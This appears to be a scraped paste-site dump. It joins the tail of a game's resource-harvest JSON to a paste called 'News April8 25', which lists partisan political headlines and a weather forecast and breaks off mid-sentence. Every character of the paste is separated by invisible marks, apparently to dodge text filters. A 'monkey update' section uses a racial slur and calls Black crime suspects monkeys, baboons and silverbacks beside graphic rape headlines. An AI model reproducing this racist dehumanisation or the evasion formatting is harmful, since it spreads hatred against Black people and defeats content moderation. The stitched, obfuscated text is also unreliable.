    ""RareFlowerharvest"": 0,
    ""RareMushroomharvest"": 0,
    ""RawSaltharvest"": 0,
    ""Re-Fertilizerharvest"": 0,
    ""RedCrystalizedSapharvest"": 0,
    ""RedGemharvest"": 0,
    ""Sandharvest"": 20,
    ""Sapharvest"": 0,
    ""ScrapMetalIngotharvest"": 0,
    ""ScrapMetalharvest"": 0,
    ""ShellFragmentharvest"": 0,
    ""SilicaPearlsharvest"": 0,
    ""Silicateharvest"": 0,
    ""Silkharvest"": 0,
    ""Sparkpowderharvest"": 0,
    ""Stimulantharvest"": 0,
    ""Stoneharvest"": 131,
    ""Sulfurharvest"": 0,
    ""Thatchharvest"": 144,
    ""UnstableElementShardharvest"": 0,
    ""UnstableElementharvest"": 0,
    ""Woodharvest"": 24,
    ""Woolharvest"": 0,
    ""WoollyRhinoHornharvest"": 0
}"
fAD1LWRG,News April8 25,Newscaster_Ned,Email,Tuesday 8th of April 2025 02:32:55 PM CDT,".‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎1‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎2‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎3‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎T‎e‎s‎t‎ ‎c‎o‎m‎p‎l‎e‎t‎e‎.‎

I‎t‎'‎s‎ ‎m‎o‎n‎k‎e‎y‎ ‎u‎p‎d‎a‎t‎e‎ ‎t‎i‎m‎e‎!‎

V‎i‎c‎e‎ ‎P‎r‎e‎s‎i‎d‎e‎n‎t‎ ‎J‎D‎ ‎V‎a‎n‎c‎e‎ ‎L‎i‎g‎h‎t‎s‎ ‎U‎p‎ ‎M‎i‎t‎c‎h‎ ‎M‎c‎C‎o‎n‎n‎e‎l‎l‎ ‎f‎o‎r‎ ‎G‎r‎a‎n‎d‎ ‎D‎i‎s‎p‎l‎a‎y‎ ‎o‎f‎ ‎'‎P‎o‎l‎
T‎r‎u‎m‎p‎ ‎t‎o‎ ‎H‎i‎t‎ ‎C‎h‎i‎n‎a‎ ‎w‎i‎t‎h‎ ‎1‎0‎4‎%‎ ‎T‎a‎r‎i‎f‎f‎s‎ ‎A‎f‎t‎e‎r‎ ‎X‎i‎ ‎J‎i‎n‎p‎i‎n‎g‎'‎s‎ ‎R‎e‎t‎a‎l‎i‎a‎t‎o‎r‎y‎ ‎T‎a‎r‎i‎f‎f‎s‎
C‎o‎p‎s‎:‎ ‎N‎Y‎C‎ ‎M‎a‎n‎ ‎A‎c‎c‎u‎s‎e‎d‎ ‎o‎f‎ ‎S‎l‎a‎s‎h‎i‎n‎g‎ ‎W‎o‎m‎a‎n‎ ‎w‎i‎t‎h‎ ‎B‎r‎o‎k‎e‎n‎ ‎B‎o‎t‎t‎l‎e‎
E‎x‎c‎l‎u‎s‎i‎v‎e‎ ‎-‎ ‎U‎.‎S‎.‎ ‎A‎t‎t‎y‎ ‎t‎o‎ ‎B‎r‎e‎i‎t‎b‎a‎r‎t‎ ‎N‎e‎w‎s‎:‎ ‎L‎.‎A‎.‎ ‎H‎o‎m‎e‎l‎e‎s‎s‎ ‎F‎u‎n‎d‎s‎ ‎'‎U‎n‎a‎c‎c‎e‎p‎t‎a‎b‎l‎e‎'‎
2‎1‎ ‎A‎G‎s‎ ‎S‎u‎p‎p‎o‎r‎t‎ ‎B‎u‎d‎g‎e‎t‎ ‎R‎e‎s‎o‎l‎u‎t‎i‎o‎n‎:‎ ‎'‎F‎a‎i‎l‎u‎r‎e‎ ‎C‎a‎n‎n‎o‎t‎ ‎B‎e‎ ‎a‎n‎ ‎O‎p‎t‎i‎o‎n‎'‎
R‎e‎p‎o‎r‎t‎:‎ ‎T‎r‎u‎m‎p‎'‎s‎ ‎D‎H‎S‎ ‎S‎i‎g‎n‎s‎ ‎D‎e‎a‎l‎ ‎w‎i‎t‎h‎ ‎I‎R‎S‎ ‎t‎o‎ ‎M‎o‎r‎e‎ ‎E‎a‎s‎i‎l‎y‎ ‎L‎o‎c‎a‎t‎e‎ ‎I‎l‎l‎e‎g‎a‎l‎s‎
W‎h‎y‎ ‎T‎r‎u‎m‎p‎ ‎H‎a‎t‎e‎r‎s‎ ‎K‎e‎e‎p‎ ‎G‎e‎t‎t‎i‎n‎g‎ ‎C‎a‎u‎g‎h‎t‎ ‎R‎e‎d‎ ‎H‎a‎n‎d‎e‎d‎ ‎a‎s‎ ‎T‎h‎e‎y‎ ‎V‎a‎n‎d‎a‎l‎i‎z‎e‎ ‎T‎e‎s‎l‎a‎ ‎E‎V‎s‎
T‎r‎u‎m‎p‎ ‎P‎e‎n‎t‎a‎g‎o‎n‎ ‎N‎o‎m‎i‎n‎e‎e‎ ‎E‎l‎b‎r‎i‎d‎g‎e‎ ‎C‎o‎l‎b‎y‎ ‎C‎o‎n‎f‎i‎r‎m‎e‎d‎ ‎b‎y‎ ‎S‎e‎n‎a‎t‎e‎
T‎r‎u‎m‎p‎ ‎P‎l‎a‎n‎ ‎t‎o‎ ‎E‎x‎p‎a‎n‎d‎ ‎D‎e‎t‎e‎n‎t‎i‎o‎n‎ ‎I‎s‎ ‎C‎h‎e‎a‎p‎e‎r‎ ‎t‎h‎a‎n‎ ‎C‎o‎s‎t‎s‎ ‎o‎f‎ ‎I‎l‎l‎e‎g‎a‎l‎ ‎I‎m‎m‎i‎g‎r‎a‎t‎i‎o‎n‎
T‎r‎u‎m‎p‎ ‎A‎d‎m‎i‎n‎ ‎P‎l‎a‎n‎n‎i‎n‎g‎ ‎$‎9‎9‎8‎ ‎F‎i‎n‎e‎ ‎p‎e‎r‎ ‎D‎a‎y‎ ‎f‎o‎r‎ ‎M‎i‎g‎r‎a‎n‎t‎s‎ ‎W‎h‎o‎ ‎F‎a‎i‎l‎ ‎t‎o‎ ‎S‎e‎l‎f‎-‎D‎e‎p‎o‎r‎t‎
L‎e‎t‎’‎s‎ ‎M‎a‎k‎e‎ ‎a‎ ‎D‎e‎a‎l‎:‎ ‎C‎o‎u‎n‎t‎r‎i‎e‎s‎ ‎L‎i‎n‎e‎ ‎u‎p‎ ‎t‎o‎ ‎N‎e‎g‎o‎t‎i‎a‎t‎e‎ ‎w‎i‎t‎h‎ ‎T‎r‎u‎m‎p‎
D‎O‎G‎E‎ ‎C‎o‎n‎s‎i‎d‎e‎r‎i‎n‎g‎ ‎C‎u‎t‎s‎ ‎t‎o‎ ‎W‎o‎k‎e‎ ‎M‎e‎d‎i‎c‎a‎l‎ ‎J‎o‎u‎r‎n‎a‎l‎s‎
E‎s‎t‎a‎b‎l‎i‎s‎h‎m‎e‎n‎t‎ ‎M‎e‎d‎i‎a‎ ‎S‎p‎e‎c‎u‎l‎a‎t‎e‎ ‎A‎b‎o‎u‎t‎ ‎B‎e‎i‎j‎i‎n‎g‎ ‎B‎a‎n‎n‎i‎n‎g‎ ‎H‎o‎l‎l‎y‎w‎o‎o‎d‎ ‎M‎o‎v‎i‎e‎s‎
T‎r‎u‎m‎p‎ ‎a‎n‎d‎ ‎C‎B‎S‎ ‎N‎e‎w‎s‎ ‎A‎g‎r‎e‎e‎ ‎o‎n‎ ‎M‎e‎d‎i‎a‎t‎o‎r‎ ‎t‎o‎ ‎S‎e‎t‎t‎l‎e‎ ‎$‎2‎0‎B‎ ‎’‎6‎0‎ ‎M‎i‎n‎u‎t‎e‎s‎’‎ ‎L‎a‎w‎s‎u‎i‎t‎
S‎t‎u‎d‎y‎:‎ ‎5‎5‎%‎ ‎o‎f‎ ‎L‎e‎f‎t‎i‎s‎t‎s‎ ‎B‎e‎l‎i‎e‎v‎e‎ ‎I‎t‎'‎s‎ ‎J‎u‎s‎t‎i‎f‎i‎a‎b‎l‎e‎ ‎t‎o‎ ‎A‎s‎s‎a‎s‎s‎i‎n‎a‎t‎e‎ ‎T‎r‎u‎m‎p‎
G‎e‎t‎ ‎A‎l‎l‎ ‎B‎r‎e‎i‎t‎b‎a‎r‎t‎ ‎N‎e‎w‎s‎ ‎H‎e‎r‎e‎
H‎o‎m‎e‎P‎a‎g‎e‎
T‎r‎u‎m‎p‎ ‎C‎r‎a‎n‎k‎s‎ ‎C‎h‎i‎n‎a‎ ‎T‎a‎r‎i‎f‎f‎s‎ ‎t‎o‎ ‎1‎0‎4‎%‎

D‎e‎l‎u‎s‎i‎o‎n‎a‎l‎ ‎X‎i‎ ‎R‎e‎f‎u‎s‎e‎s‎ ‎t‎o‎ ‎H‎a‎l‎t‎ ‎R‎e‎t‎a‎l‎i‎a‎t‎o‎r‎y‎ ‎T‎a‎r‎i‎f‎f‎s‎
C‎h‎i‎n‎a‎'‎s‎ ‎P‎r‎e‎s‎i‎d‎e‎n‎t‎ ‎X‎i‎ ‎J‎i‎n‎p‎i‎n‎g‎ ‎(‎L‎)‎ ‎a‎n‎d‎ ‎U‎S‎ ‎P‎r‎e‎s‎i‎d‎e‎n‎t‎ ‎D‎o‎n‎a‎l‎d‎ ‎T‎r‎u‎m‎p‎ ‎a‎t‎t‎e‎n‎d‎ ‎a‎ ‎w‎e‎l‎c‎o‎m‎e‎ ‎c‎e‎r‎e‎m‎
P‎r‎e‎s‎i‎d‎e‎n‎t‎ ‎D‎o‎n‎a‎l‎d‎ ‎T‎r‎u‎m‎p‎ ‎w‎i‎l‎l‎ ‎s‎l‎a‎p‎ ‎1‎0‎4‎-‎p‎e‎r‎c‎e‎n‎t‎ ‎t‎a‎r‎i‎f‎f‎s‎ ‎o‎n‎ ‎C‎h‎i‎n‎a‎ ‎a‎t‎ ‎m‎i‎d‎n‎i‎g‎h‎t‎ ‎T‎u‎e‎s‎d‎a‎y‎ ‎a‎f‎t‎e‎r‎ ‎X‎i‎ ‎J‎i‎n‎p‎i‎n‎g‎ ‎r‎e‎f‎u‎s‎e‎d‎ ‎t‎o‎ ‎w‎i‎t‎h‎d‎r‎a‎w‎ ‎r‎e‎t‎a‎l‎i‎a‎t‎o‎r‎y‎ ‎t‎a‎r‎i‎f‎f‎s‎ ‎p‎l‎a‎c‎e‎d‎ ‎o‎n‎ ‎t‎h‎e‎ ‎U‎n‎i‎t‎e‎d‎ ‎S‎t‎a‎t‎e‎s‎.‎

C‎h‎i‎n‎e‎s‎e‎ ‎S‎o‎l‎d‎i‎e‎r‎s‎ ‎C‎a‎p‎t‎u‎r‎e‎d‎ ‎F‎i‎g‎h‎t‎i‎n‎g‎ ‎I‎n‎s‎i‎d‎e‎ ‎U‎k‎r‎a‎i‎n‎e‎,‎ ‎Z‎e‎l‎e‎n‎s‎k‎y‎ ‎C‎l‎a‎i‎m‎s‎
Z‎e‎l‎e‎n‎s‎k‎y‎ ‎S‎a‎y‎s‎ ‎C‎h‎i‎n‎e‎s‎e‎ ‎S‎o‎l‎d‎i‎e‎r‎s‎ ‎C‎a‎p‎t‎u‎r‎e‎d‎ ‎F‎i‎g‎h‎t‎i‎n‎g‎ ‎I‎n‎s‎i‎d‎e‎ ‎U‎k‎r‎a‎i‎n‎e‎
3‎5‎7‎
T‎r‎u‎m‎p‎ ‎T‎h‎r‎e‎a‎t‎e‎n‎s‎ ‎C‎h‎i‎n‎a‎ ‎w‎i‎t‎h‎ ‎A‎d‎d‎i‎t‎i‎o‎n‎a‎l‎ ‎5‎0‎%‎ ‎T‎a‎r‎i‎f‎f‎s‎ ‎f‎o‎r‎ ‎I‎m‎p‎o‎s‎i‎n‎g‎ ‎R‎e‎t‎a‎l‎i‎a‎t‎o‎r‎y‎ ‎T‎a‎r‎i‎f‎f‎s‎ ‎o‎n‎ ‎U‎.‎S‎.‎
T‎r‎u‎m‎p‎ ‎T‎h‎r‎e‎a‎t‎e‎n‎s‎ ‎C‎h‎i‎n‎a‎ ‎w‎i‎t‎h‎ ‎A‎d‎d‎i‎t‎i‎o‎n‎a‎l‎ ‎5‎0‎%‎ ‎T‎a‎r‎i‎f‎f‎s‎ ‎f‎o‎r‎ ‎R‎e‎t‎a‎l‎i‎a‎t‎o‎r‎y‎ ‎T‎a‎r‎i‎f‎f‎s‎
5‎,‎4‎4‎0‎
E‎x‎c‎l‎u‎s‎i‎v‎e‎ ‎—‎ ‎I‎n‎s‎i‎d‎e‎ ‎T‎r‎u‎m‎p‎’‎s‎ ‎J‎i‎h‎a‎d‎i‎s‎t‎ ‎E‎l‎i‎m‎i‎n‎a‎t‎i‎o‎n‎ ‎U‎n‎i‎t‎ ‎a‎t‎ ‎t‎h‎e‎ ‎W‎h‎i‎t‎e‎ ‎H‎o‎u‎s‎e‎:‎ ‎S‎e‎n‎i‎o‎r‎ ‎D‎i‎r‎e‎c‎t‎o‎r‎ ‎G‎o‎
E‎x‎c‎l‎u‎s‎i‎v‎e‎:‎ ‎I‎n‎s‎i‎d‎e‎ ‎T‎r‎u‎m‎p‎’‎s‎ ‎J‎i‎h‎a‎d‎i‎s‎t‎ ‎E‎l‎i‎m‎i‎n‎a‎t‎i‎o‎n‎ ‎U‎n‎i‎t‎ ‎a‎t‎ ‎t‎h‎e‎ ‎W‎h‎i‎t‎e‎ ‎H‎o‎u‎s‎e‎
4‎,‎0‎8‎9‎
R‎e‎p‎.‎ ‎J‎a‎s‎m‎i‎n‎e‎ ‎C‎r‎o‎c‎k‎e‎t‎t‎ ‎A‎d‎v‎o‎c‎a‎t‎e‎s‎ ‎f‎o‎r‎ ‎I‎l‎l‎e‎g‎a‎l‎ ‎I‎m‎m‎i‎g‎r‎a‎t‎i‎o‎n‎:‎ ‎‘‎W‎e‎ ‎D‎o‎n‎e‎ ‎P‎i‎c‎k‎i‎n‎g‎ ‎C‎o‎t‎t‎o‎n‎’‎
R‎e‎p‎.‎ ‎C‎r‎o‎c‎k‎e‎t‎t‎ ‎A‎d‎v‎o‎c‎a‎t‎e‎s‎ ‎f‎o‎r‎ ‎I‎l‎l‎e‎g‎a‎l‎ ‎I‎m‎m‎i‎g‎r‎a‎t‎i‎o‎n‎:‎ ‎'‎W‎e‎ ‎D‎o‎n‎e‎ ‎P‎i‎c‎k‎i‎n‎g‎ ‎C‎o‎t‎t‎o‎n‎'‎
3‎,‎1‎6‎7‎
C‎a‎n‎a‎d‎a‎ ‎D‎i‎s‎c‎o‎v‎e‎r‎s‎ ‎C‎h‎i‎n‎e‎s‎e‎ ‎E‎l‎e‎c‎t‎i‎o‎n‎ ‎P‎r‎o‎p‎a‎g‎a‎n‎d‎a‎ ‎P‎r‎o‎m‎o‎t‎i‎n‎g‎ ‎L‎e‎f‎t‎i‎s‎t‎ ‎P‎M‎ ‎M‎a‎r‎k‎ ‎C‎a‎r‎n‎e‎y‎
C‎a‎n‎a‎d‎a‎ ‎D‎i‎s‎c‎o‎v‎e‎r‎s‎ ‎C‎h‎i‎n‎e‎s‎e‎ ‎E‎l‎e‎c‎t‎i‎o‎n‎ ‎P‎r‎o‎p‎a‎g‎a‎n‎d‎a‎ ‎P‎r‎o‎m‎o‎t‎i‎n‎g‎ ‎P‎M‎ ‎M‎a‎r‎k‎ ‎C‎a‎r‎n‎e‎y‎
1‎5‎5‎
D‎i‎s‎n‎e‎y‎ ‎H‎e‎i‎r‎e‎s‎s‎,‎ ‎D‎e‎m‎o‎c‎r‎a‎t‎ ‎M‎e‎g‎a‎-‎D‎o‎n‎o‎r‎ ‎F‎e‎a‎r‎s‎ ‎f‎o‎r‎ ‎H‎e‎r‎ ‎P‎a‎r‎t‎y‎’‎s‎ ‎F‎u‎t‎u‎r‎e‎:‎ ‎‘‎W‎e‎ ‎H‎a‎v‎e‎ ‎N‎o‎ ‎L‎e‎v‎e‎r‎a‎g‎e‎,‎
F‎a‎r‎-‎L‎e‎f‎t‎ ‎D‎i‎s‎n‎e‎y‎ ‎H‎e‎i‎r‎e‎s‎s‎ ‎F‎e‎a‎r‎s‎ ‎f‎o‎r‎ ‎D‎e‎m‎o‎c‎r‎a‎t‎i‎c‎ ‎P‎a‎r‎t‎y‎'‎s‎ ‎F‎u‎t‎u‎r‎e‎
4‎1‎8‎
M‎i‎c‎h‎e‎l‎l‎e‎ ‎O‎b‎a‎m‎a‎ ‎P‎o‎d‎c‎a‎s‎t‎ ‎S‎t‎r‎u‎g‎g‎l‎e‎s‎ ‎t‎o‎ ‎B‎u‎i‎l‎d‎ ‎A‎u‎d‎i‎e‎n‎c‎e‎ ‎O‎n‎e‎ ‎M‎o‎n‎t‎h‎ ‎A‎f‎t‎e‎r‎ ‎L‎a‎u‎n‎c‎h‎
M‎i‎c‎h‎e‎l‎l‎e‎ ‎O‎b‎a‎m‎a‎ ‎P‎o‎d‎c‎a‎s‎t‎ ‎S‎t‎r‎u‎g‎g‎l‎e‎s‎ ‎t‎o‎ ‎B‎u‎i‎l‎d‎ ‎A‎u‎d‎i‎e‎n‎c‎e‎ ‎A‎f‎t‎e‎r‎ ‎L‎a‎u‎n‎c‎h‎
8‎5‎6‎
D‎J‎ ‎M‎o‎b‎y‎ ‎A‎s‎k‎s‎ ‎T‎r‎u‎m‎p‎ ‎V‎o‎t‎e‎r‎s‎ ‎‘‎C‎a‎n‎ ‎Y‎o‎u‎ ‎F‎i‎n‎a‎l‎l‎y‎ ‎A‎d‎m‎i‎t‎ ‎Y‎o‎u‎ ‎W‎e‎r‎e‎ ‎W‎r‎o‎n‎g‎?‎’‎
D‎J‎ ‎M‎o‎b‎y‎ ‎A‎s‎k‎s‎ ‎T‎r‎u‎m‎p‎ ‎V‎o‎t‎e‎r‎s‎ ‎‘‎C‎a‎n‎ ‎Y‎o‎u‎ ‎F‎i‎n‎a‎l‎l‎y‎ ‎A‎d‎m‎i‎t‎ ‎Y‎o‎u‎ ‎W‎e‎r‎e‎ ‎W‎r‎o‎n‎g‎?‎’‎
5‎,‎6‎8‎7‎
B‎r‎e‎i‎t‎b‎a‎r‎t‎’‎s‎ ‎C‎a‎r‎n‎e‎y‎:‎ ‎‘‎I‎ ‎D‎o‎n‎’‎t‎ ‎T‎h‎i‎n‎k‎ ‎W‎e‎ ‎S‎h‎o‎u‎l‎d‎ ‎G‎i‎v‎e‎ ‎t‎h‎e‎ ‎S‎t‎o‎c‎k‎ ‎M‎a‎r‎k‎e‎t‎ ‎a‎ ‎V‎e‎t‎o‎ ‎o‎v‎e‎r‎ ‎t‎h‎
C‎a‎r‎n‎e‎y‎:‎ ‎I‎ ‎D‎o‎n‎'‎t‎ ‎T‎h‎i‎n‎k‎ ‎W‎e‎ ‎S‎h‎o‎u‎l‎d‎ ‎G‎i‎v‎e‎ ‎t‎h‎e‎ ‎M‎a‎r‎k‎e‎t‎ ‎a‎ ‎V‎e‎t‎o‎ ‎o‎v‎e‎r‎ ‎P‎u‎b‎l‎i‎c‎ ‎P‎o‎l‎i‎c‎y‎
2‎,‎5‎0‎4‎
R‎a‎n‎d‎ ‎P‎a‎u‎l‎:‎ ‎‘‎A‎b‎s‎o‎l‎u‎t‎e‎l‎y‎ ‎a‎ ‎F‎a‎l‎l‎a‎c‎y‎’‎ ‎U‎.‎S‎.‎ ‎G‎e‎t‎t‎i‎n‎g‎ ‎R‎i‎p‎p‎e‎d‎ ‎O‎f‎f‎ ‎B‎e‎c‎a‎u‎s‎e‎ ‎o‎f‎ ‎T‎r‎a‎d‎e‎ ‎D‎e‎f‎i‎c‎i‎t‎s‎
P‎a‎u‎l‎:‎ ‎'‎F‎a‎l‎l‎a‎c‎y‎'‎ ‎U‎.‎S‎.‎ ‎G‎e‎t‎t‎i‎n‎g‎ ‎R‎i‎p‎p‎e‎d‎ ‎O‎f‎f‎ ‎B‎e‎c‎a‎u‎s‎e‎ ‎o‎f‎ ‎T‎r‎a‎d‎e‎ ‎D‎e‎f‎i‎c‎i‎t‎s‎

C‎l‎e‎m‎e‎n‎c‎y‎ ‎D‎e‎n‎i‎e‎d‎ ‎f‎o‎r‎ ‎D‎e‎a‎t‎h‎ ‎R‎o‎w‎ ‎S‎i‎l‎v‎e‎r‎b‎a‎c‎k‎ ‎M‎a‎r‎c‎e‎l‎ ‎W‎i‎l‎l‎i‎a‎m‎s‎,‎ ‎W‎h‎o‎ ‎K‎i‎l‎l‎e‎d‎ ‎a‎ ‎B‎u‎n‎c‎h‎ ‎o‎f‎ ‎W‎o‎m‎e‎n‎ ‎a‎n‎d‎ ‎R‎a‎p‎e‎d‎ ‎T‎h‎e‎m‎.‎

N‎i‎g‎g‎a‎,‎ ‎p‎l‎e‎a‎s‎e‎.‎


M‎o‎n‎k‎e‎y‎ ‎R‎a‎p‎e‎s‎ ‎1‎6‎-‎Y‎e‎a‎r‎-‎O‎l‎d‎ ‎G‎i‎r‎l‎ ‎a‎n‎d‎ ‎C‎o‎v‎e‎r‎s‎ ‎H‎e‎r‎ ‎M‎o‎u‎t‎h‎ ‎S‎o‎ ‎S‎h‎e‎ ‎C‎a‎n‎'‎t‎ ‎S‎c‎r‎e‎a‎m‎.‎


B‎a‎t‎o‎n‎ ‎R‎o‎u‎g‎e‎ ‎G‎r‎a‎c‎i‎l‎e‎ ‎S‎t‎r‎a‎n‎g‎l‎e‎s‎ ‎W‎o‎m‎a‎n‎,‎ ‎S‎t‎o‎m‎p‎s‎ ‎o‎n‎ ‎H‎e‎r‎ ‎H‎e‎a‎d‎,‎ ‎a‎n‎d‎ ‎T‎h‎e‎n‎ ‎R‎a‎p‎e‎s‎ ‎H‎e‎r‎.‎


P‎o‎l‎i‎c‎e‎ ‎R‎e‎l‎e‎a‎s‎e‎ ‎S‎k‎e‎t‎c‎h‎ ‎o‎f‎ ‎B‎a‎b‎o‎o‎n‎ ‎W‎h‎o‎ ‎R‎a‎p‎e‎d‎ ‎W‎o‎m‎a‎n‎ ‎i‎n‎ ‎B‎a‎l‎t‎i‎m‎o‎r‎e‎ ‎A‎l‎l‎e‎y‎w‎a‎y‎.‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎W‎e‎a‎t‎h‎e‎r‎.‎

T‎o‎d‎a‎y‎
S‎u‎n‎n‎y‎
7‎9‎°‎
/‎4‎9‎°‎
0‎%‎
 ‎S‎S‎E‎ ‎5‎ ‎m‎p‎h‎
T‎u‎e‎ ‎0‎8‎ ‎|‎ ‎D‎a‎y‎
7‎9‎°‎
S‎S‎E‎ ‎5‎ ‎m‎p‎h‎
S‎u‎n‎n‎y‎.‎ ‎H‎i‎g‎h‎ ‎7‎9‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎l‎i‎g‎h‎t‎ ‎a‎n‎d‎ ‎v‎a‎r‎i‎a‎b‎l‎e‎.‎

H‎u‎m‎i‎d‎i‎t‎y‎
2‎1‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
9‎ ‎o‎f‎ ‎1‎1‎
S‎u‎n‎r‎i‎s‎e‎
7‎:‎1‎0‎ ‎a‎m‎
S‎u‎n‎s‎e‎t‎
7‎:‎5‎3‎ ‎p‎m‎
T‎u‎e‎ ‎0‎8‎ ‎|‎ ‎N‎i‎g‎h‎t‎
4‎9‎°‎
4‎%‎
S‎S‎E‎ ‎7‎ ‎m‎p‎h‎
A‎ ‎c‎l‎e‎a‎r‎ ‎s‎k‎y‎.‎ ‎L‎o‎w‎ ‎4‎9‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎S‎S‎E‎ ‎a‎t‎ ‎5‎ ‎t‎o‎ ‎1‎0‎ ‎m‎p‎h‎.‎

H‎u‎m‎i‎d‎i‎t‎y‎
5‎2‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
0‎ ‎o‎f‎ ‎1‎1‎
M‎o‎o‎n‎r‎i‎s‎e‎
4‎:‎1‎9‎ ‎p‎m‎
W‎a‎x‎i‎n‎g‎ ‎G‎i‎b‎b‎o‎u‎s‎
M‎o‎o‎n‎s‎e‎t‎
5‎:‎0‎1‎ ‎a‎m‎
W‎e‎d‎ ‎0‎9‎
S‎u‎n‎n‎y‎
8‎8‎°‎
/‎5‎5‎°‎
4‎%‎
 ‎S‎S‎W‎ ‎1‎6‎ ‎m‎p‎h‎
T‎h‎u‎ ‎1‎0‎
S‎u‎n‎n‎y‎
9‎1‎°‎
/‎5‎7‎°‎
7‎%‎
 ‎S‎S‎W‎ ‎1‎2‎ ‎m‎p‎h‎
F‎r‎i‎ ‎1‎1‎
S‎u‎n‎n‎y‎
8‎9‎°‎
/‎5‎7‎°‎
6‎%‎
 ‎E‎N‎E‎ ‎7‎ ‎m‎p‎h‎
S‎a‎t‎ ‎1‎2‎
S‎u‎n‎n‎y‎
9‎0‎°‎
/‎6‎1‎°‎
4‎%‎
 ‎S‎ ‎1‎4‎ ‎m‎p‎h‎
S‎u‎n‎ ‎1‎3‎
S‎u‎n‎n‎y‎
9‎3‎°‎
/‎6‎3‎°‎
8‎%‎
 ‎S‎ ‎1‎8‎ ‎m‎p‎h‎
M‎o‎n‎ ‎1‎4‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
9‎3‎°‎
/‎6‎5‎°‎
6‎%‎
 ‎S‎ ‎1‎5‎ ‎m‎p‎h‎
T‎u‎e‎ ‎1‎5‎
A‎M‎ ‎C‎l‎o‎u‎d‎s‎/‎P‎M‎ ‎S‎u‎n‎
8‎6‎°‎
/‎6‎1‎°‎
1‎0‎%‎
 ‎S‎E‎ ‎1‎1‎ ‎m‎p‎h‎
W‎e‎d‎ ‎1‎6‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎7‎°‎
/‎6‎6‎°‎
9‎%‎
 ‎S‎S‎E‎ ‎1‎4‎ ‎m‎p‎h‎
T‎h‎u‎ ‎1‎7‎
A‎M‎ ‎C‎l‎o‎u‎d‎s‎/‎P‎M‎ ‎S‎u‎n‎
8‎7‎°‎
/‎6‎3‎°‎
1‎7‎%‎
 ‎S‎S‎E‎ ‎1‎4‎ ‎m‎p‎h‎
F‎r‎i‎ ‎1‎8‎
M‎o‎s‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎6‎°‎
/‎6‎1‎°‎
2‎4‎%‎
 ‎S‎E‎ ‎1‎3‎ ‎m‎p‎h‎
S‎a‎t‎ ‎1‎9‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎5‎°‎
/‎6‎1‎°‎
2‎4‎%‎
 ‎E‎ ‎1‎3‎ ‎m‎p‎h‎
S‎u‎n‎ ‎2‎0‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎2‎°‎
/‎6‎2‎°‎
2‎4‎%‎
 ‎S‎E‎ ‎1‎2‎ ‎m‎p‎h‎
M‎o‎n‎ ‎2‎1‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎4‎°‎
/‎6‎1‎°‎
2‎3‎%‎
 ‎S‎ ‎1‎2‎ ‎m‎p‎h‎
T‎u‎e‎ ‎2‎2‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎6‎°‎
/‎6‎1‎°‎
2‎4‎%‎
 ‎S‎S‎E‎ ‎1‎3‎ ‎m‎p‎h‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
C‎u‎r‎r‎e‎n‎t‎ ‎t‎h‎r‎e‎a‎t‎:‎ ‎E‎a‎s‎t‎e‎r‎ ‎e‎g‎g‎s‎.‎ ‎🐣
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

V‎a‎p‎e‎
W‎h‎a‎t‎ ‎o‎r‎i‎g‎i‎n‎a‎l‎l‎y‎ ‎s‎t‎a‎r‎t‎e‎d‎ ‎a‎s‎ ‎a‎ ‎m‎e‎a‎n‎s‎ ‎o‎f‎ ‎c‎i‎g‎a‎r‎e‎t‎t‎e‎ ‎s‎m‎o‎k‎i‎n‎g‎ ‎c‎e‎s‎s‎a‎t‎i‎o‎n‎,‎ ‎t‎h‎e‎ ‎e‎l‎e‎c‎t‎r‎o‎n‎i‎c‎ ‎c‎i‎g‎a‎r‎e‎t‎t‎e‎ ‎o‎r‎ ‎""‎e‎-‎c‎i‎g‎""‎ ‎w‎a‎s‎ ‎c‎r‎e‎a‎t‎e‎d‎ ‎a‎s‎ ‎a‎ ‎m‎e‎a‎n‎s‎ ‎o‎f‎ ‎d‎e‎l‎i‎v‎e‎r‎i‎n‎g‎ ‎a‎d‎d‎i‎c‎t‎i‎v‎e‎ ‎n‎i‎c‎o‎t‎i‎n‎e‎ ‎i‎n‎t‎o‎ ‎y‎o‎u‎r‎ ‎b‎o‎d‎y‎ ‎v‎i‎a‎ ‎a‎t‎o‎m‎i‎z‎e‎d‎ ‎w‎a‎t‎e‎r‎ ‎v‎a‎p‎o‎r‎ ‎a‎s‎ ‎o‎p‎p‎o‎s‎e‎d‎ ‎t‎o‎ ‎t‎r‎a‎d‎i‎t‎i‎o‎n‎a‎l‎ ‎c‎a‎r‎c‎i‎n‎o‎g‎e‎n‎i‎c‎ ‎l‎a‎d‎e‎n‎ ‎s‎m‎o‎k‎e‎.‎ ‎A‎ ‎c‎l‎e‎v‎e‎r‎ ‎i‎d‎e‎a‎ ‎a‎l‎l‎ ‎a‎r‎o‎u‎n‎d‎ ‎a‎n‎d‎ 